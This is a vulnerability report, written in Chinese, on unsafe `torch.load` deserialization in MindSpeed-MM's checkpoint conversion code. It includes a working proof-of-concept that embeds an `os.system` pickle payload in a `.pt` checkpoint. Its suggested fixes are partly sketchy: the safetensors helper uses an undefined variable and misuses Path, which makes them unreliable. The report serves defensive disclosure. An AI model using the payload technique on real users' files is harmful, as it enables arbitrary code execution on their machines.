# checkpoint-vuln-001：MM模型Checkpoint加载torch.load无保护致反序列化RCE

**严重性**: High | **CWE**: CWE-502 | **置信度**: 90/100
**位置**: `checkpoint/vlm_model/mm_to_hf.py:92-107` @ `load_from_mm`

---

## 1. 漏洞细节

该漏洞是一个典型的不安全反序列化漏洞，位于 MindSpeed-MM 项目的 checkpoint 转换模块。`load_from_mm()` 函数在加载 Megatron 格式的 checkpoint 文件时使用了 `torch.load()` 且未设置 `weights_only=True`。

**核心问题**：
- `torch.load()` 默认使用 Python 的 `pickle` 模块进行反序列化
- `weights_only=False`（默认值）允许 pickle 执行序列化数据中的任意 Python 代码
- checkpoint 文件路径 (`pt_path`) 由外部输入 (`load_dir`) 构建
- 攻击者可通过提供恶意 checkpoint 文件实现远程代码执行

**漏洞触发条件**：
- 用户执行 checkpoint 转换操作
- 转换的目标 checkpoint 目录由用户指定（可能来自不可信来源）
- checkpoint 文件格式为 `.pt`（PyTorch pickle 格式）

## 2. 漏洞代码

### 文件: `checkpoint/vlm_model/mm_to_hf.py`

```python
def load_from_mm(load_dir: Path,
                 vit_pp_list: PP_LAYER_NUM_T,
                 llm_pp_list: PP_LAYER_NUM_T,
                 tp_size: int = 1,
                 audio_pp_list: PP_LAYER_NUM_T = None,
                 ep_size: int = 1,
                 num_experts: int = 1) -> List[STATE_DICT_T]:
    import mindspeed.megatron_adaptor  # noqa
    save_iteration = load_dir.joinpath(LATEST_TXT).read_text()
    save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}" if save_iteration != "release" else save_iteration)

    global_pp_size = max(
        len(vit_pp_list), 
        len(llm_pp_list), 
        len(audio_pp_list) if audio_pp_list else 0
    )

    state_dicts = []
    for tp_rank in range(tp_size):
        pp_state_dict = {}
        for pp_rank in range(global_pp_size):
            if ep_size > 1:
                for ep_rank in range(ep_size):
                    if global_pp_size > 1:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}_{int(ep_rank):03}")
                    else:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(ep_rank):03}")
                    pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
                    dict_ep = {}
                    # ⚠️ 漏洞点 1：第 92 行
                    # weights_only=False 允许执行任意 pickle payload
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items():
                        if tensor is not None:
                            new_key = rename_pp_ep_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank, ep_rank, ep_size, num_experts)
                            dict_ep.update({new_key: tensor})
                    pp_state_dict.update(dict_ep)
            else:
                if global_pp_size > 1:
                    current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}")
                else:
                    current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")
                pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
                print(str(pt_path).center(100, '_'))
                # 注意output_layer存在_extra_state其值为None
                # ⚠️ 漏洞点 2：第 105-107 行
                pp_state_dict.update(
                    {rename_pp_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank): tensor
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items()
                    if tensor is None})
        state_dicts.append(pp_state_dict)
    return state_dicts
```

**代码分析**：

1. **第 71-72 行**：从 `load_dir` 参数构建 checkpoint 存储目录路径
   - `load_dir.joinpath(LATEST_TXT).read_text()` - 读取迭代号文件
   - `save_dir = load_dir.joinpath(...)` - 构建实际 checkpoint 目录

2. **第 90 行**：构建 checkpoint 文件路径 `pt_path`
   - `pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)`
   - `MEGATRON_CKPT_NAME = "model_optim_rng.pt"`

3. **第 92 行和第 107 行**：使用 `torch.load()` 加载 checkpoint
   - `torch.load(pt_path, map_location='cpu', weights_only=False)`
   - **`weights_only=False` 是漏洞根源**

### 调用链分析

`load_from_mm()` 函数被以下代码调用：

```python
# checkpoint/vlm_model/mm_to_hf.py 第 234-235 行
def convert_mm_to_hf(convert_config: ConvertHFConfig, ...):
    state_dicts = load_from_mm(convert_config.mm_dir, ...)
```

其中 `convert_config.mm_dir` 来自用户输入（CLI 参数）。

## 3. 完整攻击链路

```
[入口点] CLI 参数 --mm_dir /path/to/checkpoint
↓ 参数解析到 ConvertConfig.mm_dir
[中间步骤1] convert_mm_to_hf(convert_config)@mm_to_hf.py:220
↓ 提取 mm_dir 参数
[中间步骤2] load_from_mm(load_dir=convert_config.mm_dir)@mm_to_hf.py:63
↓ 构建 checkpoint 目录路径
[中间步骤3] pt_path = save_dir.joinpath("model_optim_rng.pt")
↓ 构建 checkpoint 文件路径
[漏洞触发] torch.load(pt_path, weights_only=False)@mm_to_hf.py:92
↓ pickle 反序列化执行恶意代码
[攻击结果] 任意代码执行 (RCE)
```

## 4. 攻击场景

**攻击者画像**：
- 能提供或分发恶意 checkpoint 文件的攻击者
- 可能是模型分享者、数据提供者、或恶意合作者

**攻击向量**：
- 分发包含恶意 pickle payload 的 checkpoint 文件
- 通过公开模型仓库、邮件附件、共享存储等方式传播

**利用难度**：低

### 攻击步骤

1. **构造恶意 checkpoint**：
   ```python
   import torch
   import os
   
   class RCEPayload:
       def __reduce__(self):
           # 示例：执行系统命令
           return (os.system, ('id > /tmp/pwned.txt',))
   
   # 构建恶意 checkpoint 结构
   malicious_checkpoint = {
       'model': {
           'layer.weight': torch.randn(10, 10),
           'rce_trigger': RCEPayload()  # 恶意 payload
       }
   }
   
   # 保存为 .pt 文件
   torch.save(malicious_checkpoint, 'model_optim_rng.pt')
   ```

2. **构建正确目录结构**：
   ```bash
   mkdir -p malicious_checkpoint/release/mp_rank_00
   mv model_optim_rng.pt malicious_checkpoint/release/mp_rank_00/
   echo "release" > malicious_checkpoint/latest_checkpointed_iteration.txt
   ```

3. **诱导用户使用**：
   ```bash
   # 用户执行转换命令
   python checkpoint/convert_cli.py --mm_dir malicious_checkpoint --hf_dir output
   
   # 恶意代码被执行
   cat /tmp/pwned.txt  # 显示执行结果
   ```

## 5. 攻击条件

| 条件类型   | 要求               | 说明                                              |
| ---------- | ------------------ | ------------------------------------------------- |
| 网络可达性 | 不需要             | 攻击通过本地文件触发                              |
| 认证要求   | 不需要             | 任何能执行转换的用户                              |
| 配置依赖   | 默认配置           | 漏洞在默认代码中存在                              |
| 环境依赖   | PyTorch 环境       | 需要 torch.load() 功能                            |
| 时序条件   | 用户执行转换操作   | 需要用户主动加载 checkpoint                       |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 可窃取文件、凭证、配置、密钥等敏感数据                  |
| 完整性   | 高   | 可修改文件、植入后门、篡改数据                          |
| 可用性   | 高   | 可删除文件、中断服务、破坏系统                          |

**影响范围**：
- 执行进程权限范围内的所有资源
- 可能导致模型训练数据被窃取或污染
- 可能影响整个 AI 训练基础设施

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 脚本

```python
#!/usr/bin/env python3
"""
PoC for checkpoint-vuln-001
构造恶意 checkpoint 文件以触发不安全反序列化
仅供安全研究使用
"""
import torch
import os
import sys

class MaliciousPayload:
    """包含恶意 __reduce__ 方法的类"""
    def __reduce__(self):
        # 安全验证用的 payload
        # 实际攻击可能使用更隐蔽的代码
        return (
            os.system,
            ('echo "[checkpoint-vuln-001] RCE Triggered! uid=$(id -u)"',)
        )

def create_malicious_checkpoint():
    """创建恶意 checkpoint 文件"""
    # 正常权重数据（伪装）
    normal_weights = {
        'image_encoder.encoder.blocks.layers.0.weight': torch.randn(256, 256),
        'text_decoder.decoder.layers.0.weight': torch.randn(512, 512),
        'output_layer.weight': torch.randn(100, 512),
    }
    
    # 添加恶意 payload
    normal_weights['malicious_trigger'] = MaliciousPayload()
    
    checkpoint = {
        'model': normal_weights,
        'iteration': 5000,
        'optimizer': {}
    }
    
    return checkpoint

def setup_checkpoint_dir(output_dir='malicious_checkpoint'):
    """设置正确的 checkpoint 目录结构"""
    import subprocess
    
    # 创建目录结构
    checkpoint_path = os.path.join(output_dir, 'release', 'mp_rank_00')
    os.makedirs(checkpoint_path, exist_ok=True)
    
    # 生成并保存恶意 checkpoint
    checkpoint = create_malicious_checkpoint()
    pt_file = os.path.join(checkpoint_path, 'model_optim_rng.pt')
    torch.save(checkpoint, pt_file)
    
    # 创建迭代号文件
    with open(os.path.join(output_dir, 'latest_checkpointed_iteration.txt'), 'w') as f:
        f.write('release')
    
    print(f"[+] Malicious checkpoint created at: {output_dir}")
    print(f"[+] PT file: {pt_file}")
    return output_dir

if __name__ == '__main__':
    output_dir = sys.argv[1] if len(sys.argv) > 1 else 'malicious_checkpoint'
    setup_checkpoint_dir(output_dir)
    
    print("\n[!] To trigger the vulnerability, run:")
    print(f"    python checkpoint/convert_cli.py --mm_dir {output_dir} ...")
```

### 验证步骤

```bash
# 1. 生成恶意 checkpoint
python poc_checkpoint_vuln_001.py ./test_checkpoint

# 2. 执行转换（需要完整项目环境）
cd /path/to/MindSpeed-MM
python checkpoint/convert_cli.py --mm_dir ./test_checkpoint [其他必要参数]

# 3. 预期输出
# 控制台应显示: "[checkpoint-vuln-001] RCE Triggered! uid=<uid>"
```

**预期结果**：恶意 payload 在 `torch.load()` 时被执行。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+)
- Python: 3.8+
- PyTorch: 2.0+
- 项目依赖: 按 requirements.txt 安装

### 构建步骤

```bash
# 克隆项目
git clone <project_url>
cd MindSpeed-MM

# 安装依赖
pip install -r requirements.txt
pip install torch
```

### 验证步骤

1. 运行 PoC 脚本生成恶意 checkpoint
2. 配置必要的转换参数（可能需要 HF 模型路径等）
3. 执行转换命令
4. 检查是否触发了 payload 执行

### 预期结果

- 控制台输出恶意 payload 的执行结果
- 确认 `torch.load()` 执行了嵌入的 Python 代码

---

## 9. 修复建议

### 紧急修复

**方案 1：设置 weights_only=True**

```python
# 修改 checkpoint/vlm_model/mm_to_hf.py

# 原代码（第 92 行）：
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items():

# 修复后：
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=True)['model'].items():

# 原代码（第 105-107 行）：
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items()

# 修复后：
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=True)['model'].items()
```

**注意事项**：
- `weights_only=True` 仅加载张量数据
- 可能需要处理旧 checkpoint 格式的兼容性问题
- 需要确保 checkpoint 中没有非张量数据依赖

### 推荐修复方案

**方案 2：使用 safetensors 格式**

```python
from safetensors.torch import load_file

def load_from_mm_safe(load_dir: Path, ...):
    """使用 safetensors 格式安全加载"""
    # 如果 checkpoint 是 safetensors 格式
    safe_path = pt_path.replace('.pt', '.safetensors')
    if os.path.exists(safe_path):
        return load_file(safe_path)
    
    # 对于 .pt 文件，强制使用 weights_only=True
    return torch.load(pt_path, map_location='cpu', weights_only=True)
```

**方案 3：添加输入验证**

```python
def validate_checkpoint_path(load_dir: Path, allowed_dirs: list):
    """验证 checkpoint 路径"""
    real_path = load_dir.resolve()
    
    # 检查路径是否在允许范围内
    for allowed in allowed_dirs:
        allowed_real = Path(allowed).resolve()
        if str(real_path).startswith(str(allowed_real)):
            return True
    
    raise ValueError(f"Checkpoint path not allowed: {load_dir}")

def load_from_mm(load_dir: Path, ...):
    # 先验证路径
    validate_checkpoint_path(load_dir, ['/opt/checkpoints', '/data/models'])
    
    # 使用安全的加载方式
    ...
```

### 长期建议

1. **迁移到 safetensors**：逐步将所有 checkpoint 转换为 safetensors 格式
2. **路径沙箱化**：限制 checkpoint 来源目录
3. **安全审计**：定期扫描所有 `torch.load()` 调用
4. **文档警示**：告知用户不要加载来源不明的 checkpoint